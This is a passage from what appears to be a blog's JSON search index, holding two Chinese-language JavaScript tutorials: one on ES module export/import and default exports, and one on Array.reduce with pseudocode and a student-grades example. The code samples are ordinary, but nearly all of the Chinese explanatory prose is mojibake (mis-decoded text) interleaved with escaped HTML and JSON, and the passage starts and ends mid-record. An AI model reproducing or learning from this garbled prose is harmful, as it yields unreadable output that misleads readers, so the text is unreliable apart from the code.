\u0026#34;./countries.js\u0026#34;; ä¾‹å­å¦‚ä¸‹ï¼š\n// module-1.js const bestClub = \u0026#34;Your Club\u0026#34;; const fruits = [\u0026#34;Grape\u0026#34;, \u0026#34;Apple\u0026#34;, \u0026#34;Pineapple\u0026#34;, \u0026#34;Lemon\u0026#34;]; function multiply(x, y) { return x * y; } // Export the three statements above: export { bestClub, fruits, multiply }; // module-2.js import * as firstModule from \u0026#34;./module-1.js\u0026#34;; const bestClub = `I bought ${firstModule.multiply(2, 11)} ${firstModule.fruits[2]}s at ${firstModule.bestClub}.`; console.log(bestClub); å¦‚ä½•åœ¨ ES Module ä¸­ Export æŒ‡å®š default ç¼ºçœå¯¼å‡º å¦‚æœå¯¼å‡ºçš„æ—¶å€™æŒ‡å®š default ï¼Œå°±æ˜¯ç¼ºçœå¯¼å‡ºã€‚Default export\n// module-1.js const bestClub = \u0026#34;Your Club\u0026#34;; // Export the bestClub variable as a default export: export default bestClub; æ³¨æ„ï¼šdefault ä¸¤è¾¹æ²¡æœ‰èŠ±æ‹¬å·ï¼Œå› ä¸º default åªèƒ½æœ‰ä¸€ä¸ªï¼Œè€Œä¸”ç¼ºçœå¯¼å‡ºä¸èƒ½æ˜¯ var , let æˆ–è€… const\nå¦‚ä½• import å¯¼å…¥ç¼ºçœå¯¼å‡º ä¾ç„¶ä¸¤ç§æ–¹æ³•ï¼š\nä½¿ç”¨ default as çš„è¯­æ³• ç›´æ¥å‘½åç¼ºçœå¯¼å‡º ä¸€ã€ä½¿ç”¨ default as è¯­æ³• import { default as newName } from \u0026#34;./module-relative-path.js\u0026#34;; ä¾‹å­ï¼š\n// module-1.js // Export the string value as a default export: export default \u0026#34;Your Club\u0026#34;; // module-2.js import { default as favoriteTeam } from \u0026#34;./module-1.js\u0026#34;; const bestClub = favoriteTeam + \u0026#34; \u0026#34; + \u0026#34;is my best club.\u0026#34;; console.log(bestClub); äºŒã€ç›´æ¥å‘½åç¼ºçœå¯¼å‡º è¿™ç§æ–¹å¼ï¼Œå¯ä»¥çœ‹ä½œæ˜¯ç¬¬ä¸€ç§å»æ‰èŠ±æ‹¬å·ï¼Œå»æ‰ default as åçš„ç®€ç•¥å†™æ³•ï¼š\nimport newName from \u0026#34;./module-relative-path.js\u0026#34;; ä¾‹å­ï¼š\n// module-1.js // Export the string value as a default export: export default \u0026#34;Your Club\u0026#34;; // module-2.js import favoriteTeam from \u0026#34;./module-1.js\u0026#34;; const bestClub = favoriteTeam + \u0026#34; \u0026#34; + \u0026#34;is my best club.\u0026#34;; console.log(bestClub); overï¼Œè¿™ä¹ˆå¤šï¼Œå¤§å®¶åº”è¯¥ä¼šäº†å§ã€‚å›å¤´ä¼šå¦å¼€ä¸€ç¯‡è¯´è¯´å¦‚ä½•æŠŠæ¨¡å—éƒ½å‹åˆ°ä¸€èµ·ï¼Œé‚£å°±æ˜¯ webpack çš„åŠŸèƒ½äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20220521-javascripts_module/","summary":"\u003ch4 id=\"javascript-module-æ˜¯ä»€ä¹ˆ\"\u003eJavaScript Module æ˜¯ä»€ä¹ˆ\u003c/h4\u003e\n\u003cp\u003eä¸€ä¸ª JavaScript \u003cstrong\u003emodule\u003c/strong\u003e æ¨¡å—å‡†ç¡®çš„è¯´å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒå…è®¸ä½ æŠŠä»£ç  export å¯¼å‡ºæ¥å¤ç”¨ï¼Œè¿™æ ·åˆ«çš„ JavaScript æ–‡ä»¶å¯ä»¥ import è¿™ä¸ªæ–‡ä»¶æŠŠå®ƒä½œä¸ºåº“æ–‡ä»¶æ¥ä½¿ç”¨äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæ¨¡å—ä¸»è¦æ˜¯ç”¨åœ¨å·¥ç¨‹æ–‡ä»¶ä¸­ï¼Œç”¨æ¥æŠŠä»£ç å…±äº«ç»™å…¶ä»–æ–‡ä»¶ç”¨ï¼Œjavascipt çš„æ¨¡å—å¯ä»¥è¯´æ˜¯æ»¡å¤©é£ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™é‡Œå‘¢è®¨è®ºçš„æ˜¯å‰ç«¯çš„éƒ¨åˆ†ï¼Œå³æ˜¯è¿è¡Œåœ¨æµè§ˆå™¨ä¸­çš„ javascripts module éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯è¿è¡Œåœ¨åç«¯çš„ Node.js çš„éƒ¨åˆ†ï¼Œåç«¯ç°åœ¨å·²ç»å‘å‰ç«¯é æ‹¢äº†ã€‚\u003c/p\u003e\n\u003cp\u003eES6æ ‡å‡†å‘å¸ƒåï¼Œmoduleæˆä¸ºæ ‡å‡†ï¼Œæ ‡å‡†ä½¿ç”¨æ˜¯ä»¥exportæŒ‡ä»¤å¯¼å‡ºæ¥å£ï¼Œä»¥importå¼•å…¥æ¨¡å—ï¼Œä½†æ˜¯åœ¨æˆ‘ä»¬ä¸€è´¯çš„nodeæ¨¡å—ä¸­ï¼Œæˆ‘ä»¬ä¾ç„¶é‡‡ç”¨çš„æ˜¯CommonJSè§„èŒƒï¼Œä½¿ç”¨requireå¼•å…¥æ¨¡å—ï¼Œä½¿ç”¨module.exportså¯¼å‡ºæ¥å£ã€‚è¿™ç‚¹ä¹Ÿç†è§£æ¸…æ¥šã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬ä»é›¶æ¥ä¸€æ­¥æ­¥å¼€å§‹å§\u003c/p\u003e\n\u003ch4 id=\"å¦‚ä½•æŠŠä¸€ä¸ª-javascript-æ–‡ä»¶è½¬æ¢ä¸º-es-çš„-module\"\u003eå¦‚ä½•æŠŠä¸€ä¸ª JavaScript æ–‡ä»¶è½¬æ¢ä¸º ES çš„ module\u003c/h4\u003e\n\u003ch5 id=\"1-åˆ›å»ºä¸€ä¸ª-project-ç›®å½•\"\u003e1: åˆ›å»ºä¸€ä¸ª project ç›®å½•\u003c/h5\u003e\n\u003cp\u003eè¿™ä¸ªç›®å½•ç”¨æ¥æ”¾ HTML å’Œ JavaScript æ–‡ä»¶\u003c/p\u003e\n\u003ch5 id=\"2-å»ºç«‹ä½ çš„-code-ä»£ç æ–‡ä»¶\"\u003e2: å»ºç«‹ä½ çš„ code ä»£ç æ–‡ä»¶\u003c/h5\u003e\n\u003cp\u003eåœ¨ project æ–‡ä»¶å¤¹ä¸­å»ºç«‹2ä¸ªæ–‡ä»¶:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003eindex.html\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eindex.js\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch5 id=\"3-æ·»åŠ -javascript-æ–‡ä»¶çš„å¼•ç”¨åˆ°-html-æ–‡ä»¶ä¸­\"\u003e3: æ·»åŠ  JavaScript æ–‡ä»¶çš„å¼•ç”¨åˆ° HTML æ–‡ä»¶ä¸­\u003c/h5\u003e\n\u003cp\u003eæ‰“å¼€\u003ccode\u003eindex.html\u003c/code\u003e ç¼–è¾‘å®ƒï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-html\" data-lang=\"html\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003ehtml\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003ehead\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003emeta\u003c/span\u003e \u003cspan class=\"na\"\u003echarset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;UTF-8\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003emeta\u003c/span\u003e \u003cspan class=\"na\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;viewport\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003econtent\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003eES Module - zhang ranrui\u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003ehead\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003eh1\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003eES Module Tutorial\u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003eh1\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c\"\u003e\u0026lt;!-- Add the \u0026#34;index.js\u0026#34; JavaScript file to this HTML document --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;module\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003esrc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;index.js\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003ehtml\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¼•ç”¨äº† index.js , å¹¶å®šä¹‰å®ƒ type=\u0026ldquo;module\u0026rdquo;ï¼Œè¿™æ˜¾å¼æŒ‡æ˜äº† index.js æ˜¯ä¸€ä¸ª ES çš„moduleã€‚\u003c/p\u003e","title":"javascriptsä¸­çš„module"},{"content":"ç ”ç©¶ä¸€ä¸‹ javascripts çš„ reduce ï¼Œreduce æ˜¯æ—¢èƒ½æ”¹å˜ array çš„ sizeï¼Œåˆèƒ½æ”¹å˜æ•°å€¼çš„å‡½æ•°ï¼Œfilter æ˜¯åªèƒ½æ”¹å˜sizeï¼Œä¸èƒ½æ”¹å˜æ•°å€¼ï¼›è€Œ map æ˜¯ä¸èƒ½æ”¹å˜ sizeï¼Œå¯ä»¥æ”¹å˜æ•°å€¼ã€‚å¾ˆæ‹—å£å§ï¼Œä¸‰ä¸ªå…„å¼Ÿã€‚\nç®€å•ä»‹ç»ä¸€ä¸‹ reduceã€‚\nå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ•°ç»„:\n[1, 2, 3, 4] æˆ‘ä»¬è¦å¯¹æ•´ä¸ªæ•°ç»„æ±‚å’Œ.\nreduce å®é™…æ˜¯æŒ‰ç…§ä¸‹åˆ—çš„ç®—å¼æ¥è¿›è¡Œæ±‚å’Œçš„:\n((((1) + 2) + 3) + 4)\né‚£å®é™… reduce å‡½æ•°æ‰§è¡Œä¸­ï¼Œä½ å¯ä»¥æŒ‰ä½ éœ€æ±‚æ¥è‡ªå®šä¹‰ä½ è‡ªå·±çš„ + æ“ä½œç¬¦ã€‚æ•°ç»„çš„å€¼ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–çš„ä»»æ„ä¸œè¥¿ã€‚å¬èµ·æ¥æœ‰ç‚¹æ„æ€å§ï¼Ÿ\n1ã€ Reduce æ˜¯å¹²å˜›çš„ åœ¨ä¸€ä¸ªå‡½æ•°å¼ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œreduce å…¶å®æœ‰å¾ˆå¤šåˆ«çš„åç§°ï¼Œæ¯”å¦‚ foldï¼ˆå¯¹æŠ˜ï¼‰, accumulateï¼ˆç´¯åŠ å™¨ï¼‰, aggregateï¼ˆèšåˆå™¨ï¼‰, compressï¼ˆå‹ç¼©ï¼‰ ç”šè‡³å« injectï¼ˆæ³¨å…¥ï¼‰ã€‚\n2ã€ Reduce çš„å‚æ•° å¸¸ç”¨ç”¨æ³•å¦‚ä¸‹ï¼š\nlet myArray = [/* é¦–å…ˆå®šä¹‰ä¸€ä¸ªæ•°ç»„ */]; let callbackfn = /* å†å®šä¹‰ä¸€ä¸ªå‡½æ•° */ ; let initialvalue = /* ä»»æ„ä¸€ä¸ªåˆå§‹åŒ–çš„å€¼ */ ; myArray.reduce(callbackfn) myArray.reduce(callbackfn, initialValue) reduce çš„å‚æ•°å¦‚ä¸‹:\ncallbackfn: å¿…é¡»æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¼šåœ¨æ•´ä¸ªæ•°ç»„ä¸­åå¤è°ƒç”¨ï¼Œreduce è°ƒç”¨ callbackfn çš„æ—¶å€™æœ‰4ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬å®šä¹‰å®ƒä»¬æ˜¯ previousValue, currentElement, index å’Œ array ï¼Œçœ‹èµ·æ¥åƒä¸‹é¢ä¸€æ ·:\ncallbackfn(previousValue, currentElement, index, array) è§£é‡Šä¸€ä¸‹:\npreviousValue: è¿™ä¸ªå‚æ•°å°±æ˜¯ä¸€ä¸ªç´¯åŠ å™¨ã€‚ currentElement: æ•°ç»„ä¸­å¤„ç†çš„å½“å‰å…ƒç´ ã€‚ index: å½“å‰å…ƒç´ çš„ç´¢å¼•å€¼ã€‚ array: myArrayè°ƒç”¨çš„æ•°ç»„. Return valueï¼ˆè¿”å›å€¼ï¼‰: æœ€åä¸€æ¬¡è°ƒç”¨ callbackfn çš„æ—¶å€™ï¼Œè¿”å›å€¼å°±æ˜¯æ•´ä¸ª reduce è¿‡ç¨‹çš„è¿”å›å€¼ã€‚å¦‚æœä¸æ˜¯æœ€åä¸€æ¬¡è°ƒç”¨ï¼Œå®ƒè¿”å›çš„å€¼ä¼šè¢«ä¸‹æ¬¡çš„ callbackFn çš„ previousvalue å‚æ•°æ¥æ”¶ã€‚\næˆ‘ä»¬å¿…é¡»æ³¨æ„ï¼Œå‡½æ•°å°±æ˜¯å‡½æ•°ï¼Œå‡½æ•°è¿‡ç¨‹ä¸­å¤„ç†çš„å˜é‡è¦ä¹ˆæ˜¯å¤–å›´çš„ scope å¸¦è¿›æ¥çš„ï¼Œè¦ä¹ˆæ˜¯å‡½æ•°ä½“å†…è‡ªå®šä¹‰çš„ï¼Œæ‰€ä»¥åé¢ä¸¤ä¸ª index å’Œ array ä¹Ÿæ˜¯å¿…é¡»å­˜åœ¨çš„ï¼Œåªä¸è¿‡æ˜¯ reduce å‡½æ•°æ›¿ä½ è‡ªåŠ¨å¤„ç†äº†ã€‚\n3ã€ ç”¨ç”»å›¾æ¥ç†è§£ Reduce çœ‹ä¸Šé¢çš„å›¾ï¼Œreduce å’Œ reductRight å‡½æ•°çš„åŒºåˆ«å°±æ˜¯æ–¹å‘ï¼Œä¸€ä¸ªæ˜¯ä»å·¦åˆ°å³ï¼Œä¸€ä¸ªæ˜¯ä»å³åˆ°å·¦ã€‚\nå…³æ³¨ç‚¹å¦‚ä¸‹:\nacc ç›¸å½“äº previousValue ï¼Œç´¯åŠ å™¨. curVal ç›¸å½“äºcurrentElementï¼Œå½“å‰å¤„ç†å…ƒç´ . æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ å‘ä¸‹è¾“å‡ºåˆ°åœˆ r å°±æ˜¯curValè¾“å‡ºåˆ°***r***çš„å…·ä½“è¡¨ç°. åŒ…å«æ•°ç»„å…ƒç´ çš„é•¿æ–¹å½¢è¾“å‡ºåˆ°ä¸‹ä¸€ä¸ª r å°±æ˜¯ acc è¾“å‡ºåˆ°***r***çš„å…·ä½“è¡¨ç°. åˆå§‹åŒ–å€¼åœ¨æ•°ç»„å¤–å•ç‹¬è¡¨ç¤ºï¼Œå®ƒæ˜¯ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ acc è¾“å‡ºåˆ° r ä¸­çš„. 3ã€ ç”¨æµç¨‹å›¾æ¥ç†è§£ Reduce ä¸‹é¢ç”¨20è¡Œçš„ä¼ªä»£ç æ¥è¯¦ç»†è§£é‡Šæ•´ä¸ª reduce çš„è¿‡ç¨‹ï¼Œé¦–å…ˆè¿›å…¥ reduce å‡½æ•°ï¼š\nIf initialValue is present, å¦‚æœåˆå§‹åŒ–å˜é‡ä¸ä¸ºç©º If myArray has no elements, æ¥ç€åˆ¤æ–­å¦‚æœæ•°ç»„ä¸ºç©º Return initialValue. é‚£ä¹ˆç›´æ¥åˆå§‹åŒ–å˜é‡ä½œä¸º reduce çš„ç»“æœè¿”å› else åˆå§‹åŒ–å˜é‡ä¸ºç©ºä½†æ•°ç»„ä¸ä¸ºç©º Let accumulator be initialValue. æŠŠåˆå§‹å˜é‡èµ‹ç»™ç´¯åŠ å™¨ If the method is reduce, å¦‚æœæ–¹æ³•æ˜¯ reduce Let startIndex be the index of the leftmost element of myArray. æŠŠæ•°ç»„æœ€å·¦è¾¹çš„å…ƒç´ çš„indexå€¼èµ‹äºˆ startIndex else å¦‚æœåˆå§‹åŒ–å˜é‡ä¸ºç©º If myArray has no elements, å¦‚æœæ•°ç»„æ²¡æœ‰å…ƒç´  Throw TypeError. åˆå§‹åŒ–å˜é‡ä¸ºç©ºï¼Œæ•°ç»„ä¹Ÿä¸ºç©ºï¼Œç›´æ¥æŠ›ç±»å‹é”™è¯¯ Else if myArray has just only one element, å¦‚æœæ•°ç»„åªæœ‰ä¸€ä¸ªå…ƒç´  Return that element. é‚£ä¹ˆç›´æ¥å°†æ•°ç»„ä¸­å”¯ä¸€ä¸€ä¸ªå…ƒç´ ä½œä¸º reduce ç»“æœè¿”å› Else If the method is reduce,å¦‚æœæ–¹æ³•æ˜¯ reduce Let accumulator be the leftmost element of myArray. æŠŠæ•°ç»„æœ€å·¦è¾¹çš„ç¬¬ä¸€ä¸ªå…ƒç´ èµ‹ç»™ç´¯åŠ å™¨ If the method is reduce, å¦‚æœæ–¹æ³•æ˜¯reduce In left to right order, for each element of myArray such that its index i â‰¥ startingIndex, æŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºï¼Œéå†æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ ï¼Œæ¥ä¸ªå¤§å¾ªç¯ Set accumulator to callbackfn(accumulator, myArray[i], i, myArray). æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œéƒ½é€ä¸ªè®¾ç½®åˆ°callbackfnå‡½æ•°ä¸­å¹¶è¿è¡Œ Return accumulator. ç´¯åŠ å™¨çš„å€¼ä½œä¸º reduce ç»“æœè¿”å› ä»”ç»†ç†è§£ï¼Œæå®Œäº†å§ã€‚\nç»™ä¸ªå®é™…ä¾‹å­ï¼Œä¸€ç¾¤å­¦ç”Ÿï¼Œæœ‰ç”·æœ‰å¥³ï¼Œå…ˆé€‰å‡ºå¥³å­¦ç”Ÿï¼Œç„¶åè®¡ç®—å‡ºå¥¹ä»¬æ¯ä¸ªäººçš„å¹³å‡æˆç»©ï¼Œæœ€åæŠŠå¥¹ä»¬æ‰“å°å‡ºæ¥ï¼š\nconst students = [ { name: \u0026#34;Anna\u0026#34;, sex: \u0026#34;f\u0026#34;, grades: [4.5, 3.5, 4] }, { name: \u0026#34;Dennis\u0026#34;, sex: \u0026#34;m\u0026#34;, country: \u0026#34;Germany\u0026#34;, grades: [5, 1.5, 4] }, { name: \u0026#34;Martha\u0026#34;, sex: \u0026#34;f\u0026#34;, grades: [5, 4, 2.5, 3] }, { name: \u0026#34;Brock\u0026#34;, sex: \u0026#34;m\u0026#34;, grades: [4, 3, 2] } ]; //TODO: Compute and Return female students results using functional programming. function studentResult(students){ return students.filter(x =\u0026gt; x.sex==\u0026#34;f\u0026#34;).reduce((init,cur)=\u0026gt;{ cur[\u0026#39;grades\u0026#39;]=cur.grades.reduce((acc,cur) =\u0026gt; acc+cur,0)/cur.grades.length; return init.concat(cur); },[]); } console.log(studentResult(students)); //[ { name: \u0026#39;Anna\u0026#39;, sex: \u0026#39;f\u0026#39;, grades: 4 }, { name: \u0026#39;Martha\u0026#39;, sex: \u0026#39;f\u0026#39;, grades: 3.625 } ] æ³¨æ„ä¸€ç‚¹ï¼Œreduce å¯ä»¥åŠ¨ sizeï¼Œä¹Ÿå¯ä»¥åŠ¨å€¼ï¼Œä¸Šé¢å®é™…æ”¹å˜äº† students æ•°ç»„å…ƒç´ çš„å€¼äº†ï¼Œä¸å¤ªå¥½ã€‚åº”è¯¥èµ‹ä¸€ä¸ªæ–°å€¼ concat æˆ–è€… push è¿›æ–°æ•°ç»„ã€‚\nä¸‹é¢çš„æ–¹æ³•å°±æ²¡æœ‰åŠ¨åŸæ•°ç»„çš„æ•°æ®ï¼š\nfunction studentResult(students){ return students.filter(x =\u0026gt; x.sex==\u0026#34;f\u0026#34;).reduce((init,cur)=\u0026gt;{ let newarr = {}; newarr[\u0026#39;name\u0026#39;]=cur.name; newarr[\u0026#39;sex\u0026#39;]=cur.sex; newarr[\u0026#39;grades\u0026#39;]=cur.grades.reduce((acc,cur) =\u0026gt; acc+cur,0)/cur.grades.length; init.push(newarr); return init; },[]); } ","permalink":"https://rendoumi.com/posts/20220520-javascripts_reduce/","summary":"\u003cp\u003eç ”ç©¶ä¸€ä¸‹ javascripts çš„ reduce ï¼Œreduce æ˜¯æ—¢èƒ½æ”¹å˜ array çš„ sizeï¼Œåˆèƒ½æ”¹å˜æ•°å€¼çš„å‡½æ•°ï¼Œfilter æ˜¯åªèƒ½æ”¹å˜sizeï¼Œä¸èƒ½æ”¹å˜æ•°å€¼ï¼›è€Œ map æ˜¯ä¸èƒ½æ”¹å˜ sizeï¼Œå¯ä»¥æ”¹å˜æ•°å€¼ã€‚å¾ˆæ‹—å£å§ï¼Œä¸‰ä¸ªå…„å¼Ÿã€‚\u003c/p\u003e\n\u003cp\u003eç®€å•ä»‹ç»ä¸€ä¸‹ reduceã€‚\u003c/p\u003e\n\u003cp\u003eå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ•°ç»„:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆ‘ä»¬è¦å¯¹æ•´ä¸ªæ•°ç»„æ±‚å’Œ.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ereduce\u003c/code\u003e å®é™…æ˜¯æŒ‰ç…§ä¸‹åˆ—çš„ç®—å¼æ¥è¿›è¡Œæ±‚å’Œçš„:\u003c/p\u003e\n\u003cp\u003e((((1) + 2) + 3) + 4)\u003c/p\u003e\n\u003cp\u003eé‚£å®é™… \u003ccode\u003ereduce\u003c/code\u003e å‡½æ•°æ‰§è¡Œä¸­ï¼Œä½ å¯ä»¥æŒ‰ä½ éœ€æ±‚æ¥è‡ªå®šä¹‰ä½ è‡ªå·±çš„ + æ“ä½œç¬¦ã€‚æ•°ç»„çš„å€¼ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–çš„ä»»æ„ä¸œè¥¿ã€‚å¬èµ·æ¥æœ‰ç‚¹æ„æ€å§ï¼Ÿ\u003c/p\u003e\n\u003ch4 id=\"1-reduce-æ˜¯å¹²å˜›çš„\"\u003e\u003cstrong\u003e1ã€\u003c/strong\u003e Reduce æ˜¯å¹²å˜›çš„\u003c/h4\u003e\n\u003cp\u003eåœ¨ä¸€ä¸ªå‡½æ•°å¼ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œreduce å…¶å®æœ‰å¾ˆå¤šåˆ«çš„åç§°ï¼Œæ¯”å¦‚ \u003cstrong\u003efoldï¼ˆå¯¹æŠ˜ï¼‰\u003c/strong\u003e, \u003cstrong\u003eaccumulateï¼ˆç´¯åŠ å™¨ï¼‰\u003c/strong\u003e, \u003cstrong\u003eaggregateï¼ˆèšåˆå™¨ï¼‰\u003c/strong\u003e, \u003cstrong\u003ecompressï¼ˆå‹ç¼©ï¼‰\u003c/strong\u003e ç”šè‡³å« \u003cstrong\u003einjectï¼ˆæ³¨å…¥ï¼‰\u003c/strong\u003eã€‚\u003c/p\u003e\n\u003ch4 id=\"2-reduce-çš„å‚æ•°\"\u003e\u003cstrong\u003e2ã€\u003c/strong\u003e Reduce çš„å‚æ•°\u003c/h4\u003e\n\u003cp\u003eå¸¸ç”¨ç”¨æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003emyArray\u003c/span\u003e      \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e/* é¦–å…ˆå®šä¹‰ä¸€ä¸ªæ•°ç»„ */\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003ecallbackfn\u003c/span\u003e   \u003cspan class=\"o\"\u003e=\u003c/span\u003e /* å†å®šä¹‰ä¸€ä¸ªå‡½æ•° */ \u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 